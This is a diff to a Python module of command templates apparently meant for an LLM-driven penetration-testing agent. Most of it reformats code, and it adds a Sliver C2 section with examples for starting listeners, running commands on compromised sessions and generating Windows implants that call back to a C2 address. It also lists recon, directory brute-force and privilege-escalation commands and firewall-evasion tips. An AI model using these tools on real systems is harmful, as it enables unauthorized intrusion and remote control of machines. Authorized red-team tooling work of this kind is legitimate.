@@ -5,7 +5,6 @@ Quick command templates for common tasks.
 The agent can use these as starting points.
 """
 
-
 # Reconnaissance
 RECON_COMMANDS = {
     "ping_sweep": {
@@ -229,21 +228,22 @@ def get_command(category: str, name: str, **kwargs: object) -> str | None:
 
     if name not in ALL_COMMANDS[category]:
         return None
-    
+
     cmd = ALL_COMMANDS[category][name]["command"]
 
     # Provide a default loot_dir if not supplied.
     if "{loot_dir}" in cmd and "loot_dir" not in kwargs:
         try:
             from sploitgpt.core.config import get_settings
+
             kwargs["loot_dir"] = str(get_settings().loot_dir)
         except Exception:
             kwargs["loot_dir"] = "loot"
-    
+
     # Substitute variables
     for key, value in kwargs.items():
         cmd = cmd.replace(f"{{{key}}}", str(value))
-    
+
     return cmd
 
 
@@ -251,18 +251,16 @@ def search_commands(query: str) -> list[dict[str, str]]:
     """Search for commands by keyword."""
     results: list[dict[str, str]] = []
     query_lower = query.lower()
-    
+
     for category, commands in ALL_COMMANDS.items():
         for name, info in commands.items():
-            if (query_lower in name.lower() or 
-                query_lower in info["description"].lower() or
-                query_lower in info["command"].lower()):
-                results.append({
-                    "category": category,
-                    "name": name,
-                    **info
-                })
-    
+            if (
+                query_lower in name.lower()
+                or query_lower in info["description"].lower()
+                or query_lower in info["command"].lower()
+            ):
+                results.append({"category": category, "name": name, **info})
+
     return results
 
 
@@ -270,24 +268,24 @@ def format_commands_for_agent(category: str) -> str:
     """Format commands in a category for the agent."""
     if category not in ALL_COMMANDS:
         return f"Unknown category: {category}"
-    
+
     commands = ALL_COMMANDS[category]
     lines = [f"**{category.upper()} Commands:**\n"]
-    
+
     for name, info in commands.items():
         lines.append(f"**{name}**: {info['description']}")
         lines.append("```bash")
-        lines.append(info['example'])
+        lines.append(info["example"])
         lines.append("```")
         lines.append("")
-    
+
     return "\n".join(lines)
 
 
 def get_all_commands_formatted() -> str:
     """Get a compact reference of all commands for the LLM."""
     lines = ["## Quick Command Reference\n"]
-    
+
     # Group by task type
     task_groups = {
         "Scanning": [
@@ -297,7 +295,10 @@ def get_all_commands_formatted() -> str:
             ("masscan -p1-65535 {target} --rate=1000", "Fast full port scan"),
         ],
         "Web Enumeration": [
-            ("gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt", "Directory brute force"),
+            (
+                "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt",
+                "Directory brute force",
+            ),
             ("nikto -h {url}", "Web vulnerability scan"),
             ("whatweb {url}", "Identify web technologies"),
             ("wpscan --url {url} -e u,vp,vt", "WordPress scan"),
@@ -321,11 +322,89 @@ def get_all_commands_formatted() -> str:
             ("getcap -r / 2>/dev/null", "Find capabilities"),
         ],
     }
-    
+
     for group, commands in task_groups.items():
         lines.append(f"### {group}")
         for cmd, desc in commands:
             lines.append(f"- `{cmd}` - {desc}")
         lines.append("")
-    
+
+    return "\n".join(lines)
+
+
+# Sliver C2 Commands (for reference)
+SLIVER_COMMANDS = {
+    "listeners": {
+        "sliver_start_listener": {
+            "description": "Start a C2 listener (mTLS, HTTP, HTTPS, DNS)",
+            "example": "sliver_start_listener(protocol='mtls', port=8888)",
+        },
+        "sliver_listeners": {
+            "description": "List active listeners/jobs",
+            "example": "sliver_listeners()",
+        },
+        "sliver_stop_listener": {
+            "description": "Stop a listener by job ID",
+            "example": "sliver_stop_listener(job_id=1)",
+        },
+    },
+    "sessions": {
+        "sliver_sessions": {
+            "description": "List active sessions and beacons",
+            "example": "sliver_sessions()",
+        },
+        "sliver_use": {
+            "description": "Select a session/beacon for interaction",
+            "example": "sliver_use(target_id='abc12345')",
+        },
+        "sliver_execute": {
+            "description": "Execute command on session/beacon",
+            "example": "sliver_execute(target_id='abc12345', command='whoami')",
+        },
+        "sliver_kill": {
+            "description": "Kill a session or beacon",
+            "example": "sliver_kill(target_id='abc12345')",
+        },
+    },
+    "implants": {
+        "sliver_generate": {
+            "description": "Generate implant (session or beacon)",
+            "example": "sliver_generate(os='windows', arch='amd64', c2_url='mtls://10.0.0.1:8888', is_beacon=True)",
+        },
+        "sliver_profiles": {
+            "description": "List saved implant profiles",
+            "example": "sliver_profiles()",
+        },
+    },
+    "info": {
+        "sliver_version": {
+            "description": "Get Sliver server version and operators",
+            "example": "sliver_version()",
+        },
+    },
+}
+
+
+def get_sliver_commands_formatted() -> str:
+    """Get a compact reference of Sliver C2 tools for the LLM."""
+    lines = ["## Sliver C2 Tools\n"]
+    lines.append("Sliver is a modern C2 framework. Use these tools for post-exploitation.\n")
+
+    for category, tools in SLIVER_COMMANDS.items():
+        lines.append(f"### {category.title()}")
+        for tool_name, info in tools.items():
+            lines.append(f"- `{tool_name}` - {info['description']}")
+        lines.append("")
+
+    lines.append("### Session vs Beacon")
+    lines.append("- **Session**: Real-time interactive connection (immediate response)")
+    lines.append("- **Beacon**: Async check-in (stealthier, commands queue until next check-in)")
+    lines.append("")
+    lines.append("### C2 Protocols")
+    lines.append("- **mTLS**: Mutual TLS - most secure, certificate-based auth")
+    lines.append("- **HTTPS**: Blends with web traffic, supports domain fronting")
+    lines.append("- **HTTP**: No encryption, use for testing only")
+    lines.append("- **DNS**: Encodes commands in DNS queries, bypasses most firewalls")
+    lines.append("")
+
     return "\n".join(lines)
